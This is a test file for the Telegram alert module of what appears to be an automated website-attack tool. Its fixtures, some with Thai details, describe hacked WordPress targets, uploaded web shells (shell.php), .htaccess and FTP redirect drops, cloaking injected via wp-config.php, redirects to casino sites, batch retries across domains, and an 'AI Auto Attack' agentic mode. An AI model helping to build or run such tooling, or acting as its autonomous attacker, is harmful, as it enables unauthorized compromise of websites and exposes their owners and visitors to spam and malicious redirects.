import { describe, it, expect } from "vitest";
import { sendVulnAlert, sendAttackSuccessAlert, type VulnAlertData, type AttackSuccessData } from "./telegram-notifier";

describe("Vulnerability Alert Notifications", () => {
  it("should export sendVulnAlert function", () => {
    expect(typeof sendVulnAlert).toBe("function");
  });

  it("should accept VulnAlertData with high vulns", async () => {
    const data: VulnAlertData = {
      domain: "test.example.com",
      serverInfo: "Apache/2.4.41",
      cms: "WordPress 6.2",
      highVulns: [
        { name: "SQL Injection in plugin", severity: "high", detail: "wp-plugin vuln" },
        { name: "RCE via file upload", severity: "critical", detail: "unrestricted upload" },
      ],
      exploitableVulns: [
        { name: "File Upload Bypass", detail: "Plugin allows PHP upload" },
      ],
      writablePaths: 3,
      attackVectors: [
        { name: "Plugin Upload", successProbability: 0.85 },
        { name: "Theme Editor", successProbability: 0.60 },
      ],
      context: "Full Chain กำลังโจมตีอัตโนมัติ...",
    };

    // Verify the data structure is valid
    expect(data.domain).toBe("test.example.com");
    expect(data.highVulns.length).toBe(2);
    expect(data.exploitableVulns.length).toBe(1);
    expect(data.attackVectors?.length).toBe(2);

    // Try sending (will succeed if Telegram env vars are set, gracefully fail otherwise)
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) {
      console.log("Telegram env vars not set, skipping live alert test");
      // Still verify the function doesn't throw
      const result = await sendVulnAlert(data);
      expect(typeof result).toBe("boolean");
      return;
    }

    const result = await sendVulnAlert(data);
    expect(typeof result).toBe("boolean");
    if (result) {
      console.log("Vuln alert sent successfully to all chat IDs");
    }
  });

  it("should handle empty vulns gracefully", async () => {
    const data: VulnAlertData = {
      domain: "safe-site.com",
      highVulns: [],
      exploitableVulns: [],
    };

    // With no vulns, the function should still work without throwing
    const result = await sendVulnAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle missing optional fields", async () => {
    const data: VulnAlertData = {
      domain: "minimal.com",
      highVulns: [{ name: "Test Vuln", severity: "high" }],
      exploitableVulns: [],
    };

    const result = await sendVulnAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should include all chat IDs in alert", () => {
    // Verify env vars for multi-chat support
    const chatId1 = process.env.TELEGRAM_CHAT_ID;
    const chatId2 = process.env.TELEGRAM_CHAT_ID_2;
    const chatId3 = process.env.TELEGRAM_CHAT_ID_3;

    // At least the primary chat ID should be configured
    if (chatId1) {
      expect(chatId1).toBeTruthy();
      console.log(`Chat IDs configured: ${[chatId1, chatId2, chatId3].filter(Boolean).length}`);
    } else {
      console.log("No TELEGRAM_CHAT_ID set, skipping multi-chat test");
      expect(true).toBe(true);
    }
  });
});

describe("Attack Success Alert Notifications", () => {
  it("should export sendAttackSuccessAlert function", () => {
    expect(typeof sendAttackSuccessAlert).toBe("function");
  });

  it("should accept AttackSuccessData with full details", async () => {
    const data: AttackSuccessData = {
      domain: "target.example.com",
      method: "full_chain",
      successMethod: "wp_plugin_upload",
      redirectUrl: "https://casino-site.com",
      uploadedUrl: "https://target.example.com/wp-content/uploads/shell.php",
      verified: true,
      durationMs: 45000,
      details: "ลอง 3 วิธี สำเร็จด้วย wp_plugin_upload",
    };

    expect(data.domain).toBe("target.example.com");
    expect(data.method).toBe("full_chain");
    expect(data.successMethod).toBe("wp_plugin_upload");
    expect(data.verified).toBe(true);
    expect(data.durationMs).toBe(45000);

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle minimal attack success data", async () => {
    const data: AttackSuccessData = {
      domain: "minimal-target.com",
      method: "redirect_only",
      successMethod: "htaccess_write",
    };

    expect(data.domain).toBe("minimal-target.com");
    expect(data.method).toBe("redirect_only");

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle pipeline success with partial verification", async () => {
    const data: AttackSuccessData = {
      domain: "pipeline-target.com",
      method: "pipeline",
      successMethod: "parallel_ftp_upload",
      redirectUrl: "https://destination.com",
      uploadedUrl: "https://pipeline-target.com/redirect.php",
      verified: false,
      durationMs: 120000,
      details: "วางไฟล์สำเร็จ 3 ไฟล์ แต่ redirect ยังไม่ทำงาน",
    };

    expect(data.verified).toBe(false);
    expect(data.durationMs).toBe(120000);

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle agentic_auto success data", async () => {
    const data: AttackSuccessData = {
      domain: "agentic-target.com",
      method: "agentic_auto",
      successMethod: "AI Auto Attack (Session #42)",
      redirectUrl: "https://casino.com",
      durationMs: 300000,
      details: "AI โจมตีสำเร็จ 3 เป้าหมาย จาก 5 ที่ลอง",
    };

    expect(data.method).toBe("agentic_auto");

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle cloaking_inject success data", async () => {
    const data: AttackSuccessData = {
      domain: "cloaking-target.com",
      method: "cloaking_inject",
      successMethod: "php_cloaking",
      uploadedUrl: "https://cdn.example.com/cloaking.js",
      verified: true,
      durationMs: 60000,
      details: "Cloaking inject สำเร็จ — injected via wp-config.php",
    };

    expect(data.method).toBe("cloaking_inject");
    expect(data.verified).toBe(true);

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });

  it("should handle batch retry success data", async () => {
    const data: AttackSuccessData = {
      domain: "batch_retry",
      method: "retry_all_failed",
      successMethod: "Batch Retry (5/20)",
      durationMs: 600000,
      details: "Retry 20 domains: 5 สำเร็จ, 10 ล้มเหลว, 5 ข้าม (หมดวิธี)",
    };

    expect(data.method).toBe("retry_all_failed");

    const result = await sendAttackSuccessAlert(data);
    expect(typeof result).toBe("boolean");
  });
});
